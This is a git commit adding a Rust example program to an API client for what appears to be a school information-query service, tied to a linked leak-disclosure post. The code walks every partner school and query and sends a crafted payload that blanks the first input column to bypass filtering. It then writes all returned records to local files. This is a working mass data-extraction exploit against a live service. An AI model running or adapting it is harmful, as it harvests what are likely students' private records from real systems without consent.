0c3d5f932ae2d24a5c5548012821ae9c43f16b70
xtex <xtexchooser@duck.com>
2024-04-14 10:22:56 +0800

    Disclosure dump all example

---
+++ yjqyapi/examples/dump_all_infoqueries.rs
@@ -0,0 +1,42 @@
+use anyhow::Result;
+use std::fs;
+use yjqyapi::{
+    infoquery::InfoQueryAccess, partners::PartnerSchoolsAccess, QyClient,
+};
+
+/// 获取“信息查询”的所有数据
+/// 参见 <https://blog.xtexx.eu.org/2024/04/13-yjzqy-net-leak-disclosure/>
+#[tokio::main]
+async fn main() -> Result<()> {
+    let c = QyClient::new(Default::default()).await?;
+    for (school, school_name) in c.partner_schools().await? {
+        println!("学校：{} {}", school, school_name);
+        for query in c.info_queries(&school).await? {
+            println!("    查询：{}", query.text);
+            let dir = format!(
+                "output/{}{}/{}{}",
+                school, school_name, query.id, query.text
+            );
+            fs::create_dir_all(&dir)?;
+
+            let mut cols =
+                c.info_query_input_columns(&school, &query.id).await?;
+
+            fs::write(
+                format!("{}/cols.json", &dir),
+                serde_json::to_string_pretty(&cols)?,
+            )?;
+
+            // 构造利用载荷
+            cols[0].text = "".to_owned();
+            let results = c
+                .do_info_query(&school, &query.id, [(&cols[0], "啊对对对")])
+                .await?;
+            fs::write(
+                format!("{}/results.json", &dir),
+                serde_json::to_string_pretty(&results)?,
+            )?;
+        }
+    }
+    Ok(())
+}
